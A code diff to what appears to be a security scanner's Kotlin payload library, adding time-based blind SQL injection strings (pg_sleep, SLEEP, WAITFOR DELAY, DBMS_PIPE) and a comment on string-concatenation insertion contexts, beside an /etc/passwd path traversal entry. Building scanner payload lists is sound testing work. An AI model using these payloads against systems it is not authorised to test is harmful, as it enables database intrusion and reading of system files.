@@ -27,7 +27,17 @@ object PayloadLibraries {
             "' UNION SELECT NULL-- -",
             "' AND SLEEP(5)-- -",
             "1) AND SLEEP(5)-- -",
-            "';WAITFOR DELAY '0:0:5'-- -"
+            "';WAITFOR DELAY '0:0:5'-- -",
+            "' AND pg_sleep(5)-- -",
+            // Comment-truncation payloads (above) never reach the sleep call when the value is
+            // concatenated BETWEEN two string literals rather than terminating a clause — these
+            // close-then-reopen the string instead, for that insertion context (e.g. a cookie
+            // value used as `... WHERE col = 'x' || :value || 'y'`).
+            "x'||pg_sleep(5)||'",
+            "'||pg_sleep(5)||'",
+            "x' AND SLEEP(5) AND 'x'='x",
+            "x';WAITFOR DELAY '0:0:5'--",
+            "'||(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)||'"
         ),
         "traversal" to listOf(
             "../../../../etc/passwd",
